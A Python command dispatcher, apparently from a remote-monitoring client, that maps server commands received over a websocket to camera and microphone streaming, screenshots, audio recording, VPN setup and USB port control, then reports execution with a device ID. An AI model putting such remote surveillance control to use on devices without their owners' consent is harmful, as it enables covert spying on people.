import json
import time
from clientV2.core.services.logger_service import LoggerService
from clientV2.adapters.devices import camera_adapter, screenshot_adapter, microphone_adapter
from clientV2.core.use_cases import vpn_connection, usb_ports, send_recorded_audio
from clientV2.utils.device_id import get_device_id

# Словарь команд и соответствующих обработчиков.
COMMAND_HANDLERS = {
    "start_camera": camera_adapter.start_camera_stream,
    "stop_camera": camera_adapter.stop_camera_stream,
    "capture_frame": camera_adapter.capture_frame,
    "start_mic": microphone_adapter.start_audio_stream,
    "stop_mic": microphone_adapter.stop_audio_stream,
    "record_audio": send_recorded_audio.send_recorded_audio,
    "screenshot": screenshot_adapter.screenshot,
    "create_vpn": vpn_connection.create_vpn_connection,
    "enable_usb": usb_ports.enable_usb_ports,    # включение USB-портов
    "disable_usb": usb_ports.disable_usb_ports,  # отключение USB-портов
}

def process_command(ws_client, command: str, logger: LoggerService):
    """
    Обрабатывает команду, выполняет соответствующий обработчик и, если команда распознана,
    отправляет подтверждение серверу с действием "command_executed".
    """
    cmd = command.lower().strip()
    logger.info(f"Processing command: {cmd}")
    handler = COMMAND_HANDLERS.get(cmd)
    if handler:
        result = handler()  # Вызываем обработчик; если функция что-то возвращает, можно обработать результат.
        logger.info(f"Command '{cmd}' executed successfully.")
        

        # Формируем сообщение подтверждения
        confirmation_message = {
            "action": "command_executed",
            "device_key": get_device_id(),  # Идентификатор устройства
            "payload": {
                "command": cmd,
                "timestamp": int(time.time())
            }
        }

        try:
            ws_client.send_message(json.dumps(confirmation_message))
            logger.info("Sent command_executed confirmation message.")
        except Exception as e:
            logger.error(f"Error sending command_executed message: {e}")
    else:
        logger.info(f"Unknown command received: {command}")